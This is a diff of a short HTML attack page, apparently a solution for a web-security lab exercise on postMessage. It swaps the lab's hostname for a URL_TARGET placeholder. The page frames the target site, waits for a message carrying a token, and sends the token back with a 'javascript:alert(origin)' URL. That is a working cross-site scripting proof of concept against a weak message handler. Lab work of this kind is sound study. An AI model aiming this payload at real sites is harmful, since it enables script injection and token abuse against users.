@@ -6,12 +6,12 @@
     <title>Post Message 3</title>
 </head>
 <body style="display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #181818;">
-    <iframe src="https://oqsuhtowdz.voorivex-lab.online" id="targetIframe" style="width: 80%; height: 300px; border: 2px solid #ffffff; border-radius: 5px;"></iframe>
+    <iframe src="URL_TARGET" id="targetIframe" style="width: 80%; height: 300px; border: 2px solid #ffffff; border-radius: 5px;"></iframe>
     <script>
         const iframe = document.getElementById("targetIframe");
 
         window.addEventListener("message", ({ origin, data }) => {
-            if (origin === "https://oqsuhtowdz.voorivex-lab.online" && data?.token) {
+            if (origin === "URL_TARGET" && data?.token) {
                 iframe.contentWindow.postMessage(
                     { token: data.token, url: "javascript:alert(origin)" }, 
                     origin
